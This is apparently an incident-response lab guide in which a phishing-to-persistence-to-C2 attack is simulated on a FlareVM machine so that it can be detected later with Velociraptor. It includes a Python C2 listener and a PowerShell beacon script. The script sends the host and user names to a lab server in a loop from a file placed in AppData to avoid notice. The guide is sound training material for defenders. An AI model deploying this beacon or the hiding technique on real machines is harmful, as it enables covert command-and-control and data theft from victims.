# Phase 3 - Simulated Compromise and Detection

## Overview

This phase simulates a phishing-to-persistence-to-C2 kill chain
on FlareVM, then uses all five forensic artifacts from Phase 2
to detect and document every stage of the attack.

---

## Scenario A - MSSP Simulation

Starting snapshot: `FlareVM-Sysmon-Installed-Baseline`

### Kill Chain

| Step | Action |
|---|---|
| 1 | Malicious LNK file opened by user |
| 2 | PowerShell drops payload.ps1 to `AppData\Microsoft\Windows` |
| 3 | Scheduled task created for persistence |
| 4 | payload.ps1 beacons to C2 at `192.168.100.3:4444` |

### Lab Setup

**Ubuntu VM (192.168.100.3)**
- Velociraptor Server - collects artifacts
- C2 Listener - receives beacon on port 4444

**FlareVM (192.168.100.4)**
- Velociraptor Client - reports to server
- Victim machine - runs the kill chain

---

## Step 1 - C2 Listener

On the Ubuntu VM, open a terminal and start the listener:

```bash
mkdir -p /tmp/c2
cd /tmp/c2
python3 -m http.server 4444
```

Expected output:

```bash
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

> **What this does:** The Python HTTP server acts as the C2 receiver.
> When FlareVM's payload beacons to `192.168.100.3:4444`, this server
> logs the connection. In a real incident this IP would be the
> attacker's infrastructure - the first pivot point for scoping the breach.

Leave this running. Open a second terminal for remaining Ubuntu commands.

---

## Step 2 - Build the Payload

On FlareVM, open PowerShell as Administrator and run:

```powershell
$payloadContent = @'
# Simulated C2 beacon payload
# Phase 3 - Velociraptor IR Lab

$C2Server = "http://192.168.100.3:4444"
$Hostname = $env:COMPUTERNAME
$Username = $env:USERNAME

while ($true) {
    try {
        $beacon = Invoke-WebRequest -Uri "$C2Server/beacon" `
            -Method POST `
            -Body "host=$Hostname&user=$Username&status=alive" `
            -UseBasicParsing
        Write-Output "[+] Beacon sent successfully"
    }
    catch {
        Write-Output "[-] Beacon failed: $_"
    }
    Start-Sleep -Seconds 30
}
'@

$payloadPath = "$env:APPDATA\Microsoft\Windows\payload.ps1"
$payloadContent | Out-File -FilePath $payloadPath -Encoding ASCII
Get-Item $payloadPath
```

> **Why this path:** `AppData\Microsoft\Windows\` blends in with
> legitimate Windows file structure. Real droppers land payloads here
> specifically because it rarely gets scrutinised. This is what the
> MFT and Prefetch artifacts will catch in the detection phase.

---
